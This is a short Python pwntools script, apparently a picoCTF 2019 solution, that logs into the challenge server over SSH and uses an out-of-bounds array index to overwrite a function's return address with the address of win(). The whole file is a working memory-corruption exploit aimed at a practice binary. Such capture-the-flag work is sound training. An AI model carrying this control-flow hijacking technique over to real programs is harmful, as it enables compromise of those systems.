from pwn import *
import time

USERNAME = 'yourname'
PASSWORD = 'password'

# address of win()
win_addr = 0x080485c6
# stack address of array
array_ptr = 0xffffc5e0
# return address of replaceIntegerInArrayAtIndex
replaceIntegerInArrayAtIndex_ret_addr = 0xffffc5cc

index = (replaceIntegerInArrayAtIndex_ret_addr - array_ptr) // 4

s = ssh(user=USERNAME, host='2019shell1.picoctf.com', password=PASSWORD)
sh = s.run('sh')
sh.sendline('cd /problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7')
sh.sendline('./vuln')

sh.recvuntil('\n\n')
sh.sendline(str(win_addr))
sh.recvuntil('\n\n')
sh.sendline(str(index))
print(sh.recv())
sh.close()